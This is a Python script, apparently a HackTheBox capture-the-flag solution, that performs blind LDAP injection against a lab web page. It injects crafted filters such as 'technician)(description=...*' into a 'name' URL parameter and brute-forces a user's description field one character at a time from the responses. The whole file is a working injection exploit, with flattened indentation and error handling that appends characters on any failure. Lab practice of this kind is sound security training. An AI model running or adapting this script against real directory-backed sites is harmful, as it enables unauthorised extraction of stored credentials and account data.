```python
#!/usr/bin/env python3

import requests
import re
import signal
import pdb
import time
import sys
import string

from termcolor import colored
from pwn import *

def def_handler(sig, frame):
print(colored("\n\n[!] Saliendo...\n", 'red'))
sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url = 'http://internal.analysis.htb/users/list.php?name='
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + '.*&$%@#'

def ldap_injection():
p1 = log.progress("Ldap Injection")
p1.status("String Ldap Injections")

time.sleep(2)

p2 = log.progress("Description")

description = ""

for position in range(30):
for character in characters:
try:
p1.status(main_url + f"technician)(description={description}{character}*")
r = requests.get(main_url + f"technician)(description={description}{character}*")

username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]

  

if "technician" in username:

description += character

p2.status(character)

break

except:

description += character

p2.status(character)

break

  

if __name__ == '__main__':

ldap_injection()
```